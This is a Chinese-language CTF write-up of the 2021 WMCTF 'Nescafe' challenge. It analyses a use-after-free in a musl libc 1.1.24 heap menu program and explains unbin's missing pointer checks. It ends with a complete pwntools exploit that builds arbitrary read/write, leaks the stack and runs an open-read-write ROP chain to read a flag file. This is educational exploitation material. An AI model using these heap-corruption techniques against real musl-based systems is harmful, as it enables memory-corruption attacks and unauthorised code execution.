# 从2021 WMCTF Nescafe学习musl libc UAF 利用

阅读量 **149938**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-13 15:30:19

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01c03bdf25f0f1a68b.png)

musl libc是一种轻量级的C标准动态链接库，用来替代日益臃肿的glibc，Alpine Linux，Openwrt以及Gentoo等都是用musl
libc作为默认的libc库。目前基于musl libc出的pwn题目也是越来越多。这几天参加了2021 WMCTF就遇到了一个基于musl libc
1.1.24的堆UAF漏洞利用的题目。

## 分析

首先我们看一下给出的libc.so文件

    
    
    musl libc (x86_64)
    Version 1.1.24
    Dynamic Program Loader
    Usage: ./libc.so [options] [--] pathname [args]
    

可以看到这里的这个程序是基于musl libc 1.1.24版本运行的。musl libc 的源代码可以从官网上下载。

我们首先分析一下给出的二进制程序。这里的程序逻辑很简单就是一个简单的菜单题目

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      init();
      welcome(argc, argv);
      while ( 1 )
      {
        menu();
        switch ( (unsigned int)get_int() )
        {
          case 1u:
            create();
            break;
          case 2u:
            del();
            break;
          case 3u:
            show();
            break;
          case 4u:
            edit();
            break;
          case 5u:
            exit(0);
          default:
            puts("Invalid choice");
            break;
        }
      }
    }
    

在init函数中开启了沙箱。

    
    
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
     0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
     0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0007: 0x06 0x00 0x00 0x00000000  return KILL
    

也就是这里我们只能执行orw，而没办法直接执行/bin/sh了。我们依次来分析一下，这里的create函数

    
    
    int create()
    {
      __int64 v0; // rax
      unsigned int i; // [rsp+4h] [rbp-Ch]
      void *buf; // [rsp+8h] [rbp-8h]
    
      buf = malloc(0x200uLL);
      puts("Please input the content");
      LODWORD(v0) = read(0, buf, 0x200uLL);
      for ( i = 0; i <= 4; ++i )
      {
        v0 = noteList[i];
        if ( !v0 )
        {
          noteList[i] = buf;
          LODWORD(v0) = puts("Done");
          return v0;
        }
      }
      return v0;
    }
    

这里的create函数只能分配0x200大小的堆块，并且需要注意到的一点就是这里我们只能保存5个堆块指针，分配到的堆块的指针会被保存早note_list这个数组中。delete函数

    
    
    int del()
    {
      __int64 v0; // rax
      unsigned int v2; // [rsp+Ch] [rbp-4h]
    
      puts("idx:");
      v2 = get_int();
      if ( v2 > 5 )
      {
        puts("Invalid idx");
        exit(0);
      }
      v0 = noteList[v2];
      if ( v0 )
      {
        free((void *)noteList[v2]);
        LODWORD(v0) = puts("Done");
      }
      return v0;
    }
    

也就是根据我们给出的index的值来释放对应的堆块，可以看到这里在释放堆块之后并没有清空数组中的堆块指针导致这里存在一个UAF漏洞。show函数就是根据我们指定的index的值来进行堆块的内容输出，但是这里的show函数只能使用一次。edit函数则是根据我们指定的index向对应的堆块中写入最多0x200大小的内容。

## 漏洞利用

我们现在拥有了一个UAF的漏洞，那么这个漏洞应该怎么利用呢，这里首先我们需要想了解一下musl
libc中堆空间的分配机制，可以参考下面这篇文章讲的很是详细。

[从一次 CTF 出题谈 musl libc 堆漏洞利用](https://www.anquanke.com/post/id/202253#h2-4)

这里简单的说一下，64位下musl
libc中堆块的大小是0x20对齐的，也就是最小的堆块是0x20，然后是0x40。并且所有的空闲堆块都是通过类似于small
bin的双向链表来进行组织的。并且和glibc不同的是，musl
libc中存在一个静态堆内存，也就是将程序和libc库的空闲内存划分为堆内存，这两块的内存空间是一开始就加入到双向链表之中的。如下

    
    
    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555400000     0x555555402000 r-xp     2000 0      /root/work/ques/2021WMCTF/work/Nescafe/pwn_debug
        0x555555601000     0x555555602000 r--p     1000 1000   /root/work/ques/2021WMCTF/work/Nescafe/pwn_debug
        0x555555602000     0x555555603000 rw-p     1000 2000   /root/work/ques/2021WMCTF/work/Nescafe/pwn_debug
        0x7ffff7d69000     0x7ffff7dfb000 r-xp    92000 0      /usr/lib/x86_64-linux-musl/libc.so
        0x7ffff7ff4000     0x7ffff7ff8000 r--p     4000 0      [vvar]
        0x7ffff7ff8000     0x7ffff7ffa000 r-xp     2000 0      [vdso]
        0x7ffff7ffa000     0x7ffff7ffb000 r--p     1000 91000  /usr/lib/x86_64-linux-musl/libc.so
        0x7ffff7ffb000     0x7ffff7ffc000 rw-p     1000 92000  /usr/lib/x86_64-linux-musl/libc.so
        0x7ffff7ffc000     0x7ffff7fff000 rw-p     3000 0
        0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
            0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
    
    pwndbg> p mal.bins
    $1 = {{
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } <repeats 38 times>, {
        lock = {0, 0},
        head = 0x7ffff7ffe3b0,
        tail = 0x7ffff7ffe3b0
      }, {
        lock = {0, 0},
        head = 0x555555602070,
        tail = 0x555555602070
      }, {
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } <repeats 24 times>}
    

也就是说如果我们知道了起始的一个堆块的地址，那么我们就有可能知道libc的基地址或者是程序的基地址，如果我们知道了程序的基地址或者libc的基地址，那么我们也能计算出堆块的地址。从堆块的组织结构上来看，我们也能猜测的到，当进行内存分配的时候libc肯定是将堆块从链表中卸下，也就是一个类似于unlink的操作，不过在musl
libc中这个函数是unbin函数，我们看一下这个函数。

    
    
    static void unbin(struct chunk *c, int i)
    {
        if (c->prev == c->next)
            a_and_64(&mal.binmap, ~(1ULL<<i));
        c->prev->next = c->next;
        c->next->prev = c->prev;
        c->csize |= C_INUSE;
        NEXT_CHUNK(c)->psize |= C_INUSE;
    }
    

这里的这个bitmap就是用来表示所有的bins链表是否为空的位图，这里可以看到如果prev和next指针相同的话，那么就会清空位图，表示这个链表中没有数据了。并且为了提高执行速度，在进行unlink的时候没有对next和prev指针进行检查。

## 漏洞利用

前面我们说到，程序存在一个UAF的漏洞，并且通过堆malloc的源码进行分析，这里在unlink的时候没有对next和prev指针进行检查，导致我们可以覆写这两个指针，在进行unlink的时候实现一个任意地址写的操作。由于在musl
libc中没有像glibc中那样的malloc_hook这种方便的函数指针的改写，一般在这里用到的是FSOP即覆写FILE结构体中的某些指针来劫持控制流。我们看一下这里的exit函数

    
    
    _Noreturn void exit(int code)
    {
        __funcs_on_exit();
        __libc_exit_fini();
        __stdio_exit();
        _Exit(code);
    }
    
    void __stdio_exit(void)
    {
        FILE *f;
        for (f=*__ofl_lock(); f; f=f->next) close_file(f);
        close_file(__stdin_used);
        close_file(__stdout_used);
        close_file(__stderr_used);
    }
    

可以看到这里存在一个`__stdio_exit`
函数，这个函数就类似与glibc中的cleanup函数，也就是刷新每个FILE结构体，这里的是对每个FILE结构体调用close_file函数，我们看一下这个结构体

    
    
    struct _IO_FILE {
        unsigned int flags;
        unsigned char *rpos;
        unsigned char *rend;
        int (*close)(FILE *);
        unsigned char *wend;
        unsigned char *wpos;
        unsigned char *mustbezero_1;
        unsigned char *wbase;
        size_t (*read)(FILE *, unsigned char *, size_t);
        size_t (*write)(FILE *, const unsigned char *, size_t);
        off_t (*seek)(FILE *, off_t, int);
        unsigned char *buf;
        size_t buf_size;
        FILE *prev;
        FILE *next;
        int fd;
        int pipe_pid;
        long lockcount;
        int mode;
        volatile int lock;
        int lbf;
        void *cookie;
        off_t off;
        char *getln_buf;
        void *mustbezero_2;
        unsigned char *shend;
        off_t shlim;
        off_t shcnt;
        FILE *prev_locked;
        FILE *next_locked;
        __locale_struct *locale;
    }
    

可以看到结构体中存在很多歌函数指针，这里又一个close函数指针，当close_file函数调用的时候实际上就是执行的这个函数指针。也就是说如果我们可以覆写这个函数指针的话，那么这里我们就可以劫持程序流。程序中当我们输入5选择的时候就会执行exit函数。但是这里当我进行调试的时候发现，exit函数前面的三个函数调用都不见了，直接就是`_Exit(code);`
的函数调用。

    
    
    0x5555554008d0 <_exit@plt>    jmp    qword ptr [rip + 0x20170a] <_exit>
    ↓
    0x7ffff7dc26c1 <_exit>        push   rax
    0x7ffff7dc26c2 <_exit+1>      call   _Exit <_Exit>
    

也就是这里我们可能没办法直接使用FSOP了。那么应该怎么做呢，最直接的方法就是直接覆写返回地址从而执行orw。那么这里我们就需要泄漏一下栈地址，在当前的程序中想到的泄漏栈地址的方法就是直接通过libc[‘environ’]来进行栈地址的泄漏，但是首先我们需要拿到任意地址读写，简单的方法就是通过buflist这个数组来进行任意地址读写了。但是这个数组位于程序的bss段上，怎么分配堆块到那里呢，因为一开始我们并不知道程序的基地址，但是通过上面的分析，musl
libc中存在一个静态堆内存空间，恰好程序段上就有一个，并且是紧紧挨着buflist的。

    
    
    pwndbg> p mal.bins
    $1 = {{
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } <repeats 38 times>, {
        lock = {0, 0},
        head = 0x7ffff7ffe3b0,
        tail = 0x7ffff7ffe3b0
      }, {
        lock = {0, 0},
        head = 0x555555602070,
        tail = 0x555555602070
      }, {
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } <repeats 24 times>}
    pwndbg> x/20gx $rebase(0x202040)
    0x555555602040 <noteList>:      0x0000000000000000      0x0000000000000000
    0x555555602050 <noteList+16>:   0x0000000000000000      0x0000000000000000
    0x555555602060 <noteList+32>:   0x0000000000000000      0x0000000000000000
    0x555555602070: 0x0000000000000001      0x0000000000000f80
    0x555555602080: 0x00007ffff7ffbe68      0x00007ffff7ffbe68
    0x555555602090: 0x0000000000000000      0x0000000000000000
    0x5555556020a0: 0x0000000000000000      0x0000000000000000
    0x5555556020b0: 0x0000000000000000      0x0000000000000000
    0x5555556020c0: 0x0000000000000000      0x0000000000000000
    0x5555556020d0: 0x0000000000000000      0x0000000000000000
    

这里很明显的一种思路就是覆写mal.bins中的head指针了，将其低1位改小就可以直接分配堆块到buflist上去了。但是首先我们需要拿到mal.bins的写权限，也就是分配堆块到mal.bins上。

这里由于一开始就将堆块插入到链表上，因此在我们初始进行堆块分配的时候堆块里面其实是存储有libc附近的地址的，这里一开始我们就可以泄漏的到libc的基地址。并且由于unbin的时候没有对next和prev进行检查，因此我们可以通过这里造成的漏洞覆写mal.bins中的某个链表的head为mal.bins中的某个地址，从而在下一次分配的时候直接分配到mal.bins链表上，进而覆写head指针的低位，那么这里就能做到任意地址读写了。

有了任意地址读写之后就好办了，直接通过libc[‘environ’]泄漏拿到栈地址，然后覆写返回地址就可以了。

## EXP

    
    
    # -*- coding: utf-8 -*-    import logging
    import syslog
    
    from pwn import *
    
    file_path = "./pwn_debug"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    
    if debug:
        # path = change_ld('./pwn', b'/lib/ld-musl-x86_64.so.1')
        # p = path.process(env={'LD_PRELOAD': './libc.so'})
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xF08)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('47.104.169.32', 11543)
        libc = ELF('./libc.so')
        one_gadget = 0x0
    
    def add(content=b"\n"):
        p.sendlineafter(">>", "1")
        p.sendafter("the content\n", content)
    
    def delete(index):
        p.sendlineafter(">>", "2")
        p.sendlineafter("idx:\n", str(index))
    
    def show(index):
        p.sendlineafter(">>", "3")
        p.sendlineafter("idx\n", str(index))
    
    def edit(index, content):
        p.sendlineafter(">>", "4")
        p.sendlineafter("idx:\n", str(index))
        p.sendafter("Content\n", content)
    
    def shutdown():
        p.sendlineafter(">>", "5")
    
    
    add(b"a" * 0x8)
    show(0)
    p.recvuntil("a" * 0x8)
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x292e50
    
    stderr = libc.address + 0x292100
    stdin = libc.address + 0x292200
    binmap = libc.address + 0x292ac0
    brk = libc.address + 0x295050
    bin = libc.address + 0x292e10
    system = libc.address + 0x42688
    chunk_add = libc.address + 0x2953c0
    environ = libc.address + 0x294fd8
    
    add(b"a" * 0x8)
    delete(0)
    
    next = bin - 0x10
    prev = stderr
    edit(0, p64(next) + p64(next) + b"./flag".ljust(8, b"\x00")*0x10)
    add(p64(chunk_add)*2)
    add()
    edit(3, b"\x00"*0x60 + p64(0) + b"\x30")
    add(p64(0)*6)
    show(0)
    elf.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x202040
    buf_address = elf.address + 0x202040
    
    payload = p64(buf_address) + p64(environ) + p64(0)*4
    edit(0, payload)
    show(1)
    stack_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    
    payload =p64(buf_address) + p64(stack_address - 0x78) + p64(0)*4
    edit(0, payload)
    
    p_rdi_r = 0x0000000000014862 + libc.address
    p_rsi_r = 0x000000000001c237 + libc.address
    p_rdx_r = 0x000000000001bea2 + libc.address
    p_rax_r = 0x000000000001b826 + libc.address
    leave = 0x000000000001b26d + libc.address
    ret = 0x000000000004c70a + libc.address
    syscall = 0x00000000000247d5 + libc.address
    flag_str_address = chunk_add + 0x20
    flag_address = chunk_add + 0x30
    
    orw = flat([
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        p_rax_r, 2,
        syscall,
        p_rdi_r, 3,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 1,
        syscall
    ])
    
    payload = orw
    
    edit(1, payload)
    
    p.interactive()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **daydayup** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/251832](/post/id/251832)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [UAF](/tag/UAF)
  * [must](/tag/must)

 **+1** __4赞

 __收藏

![](https://p0.ssl.qhimg.com/t019c2327b208e38f32.png) daydayup

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

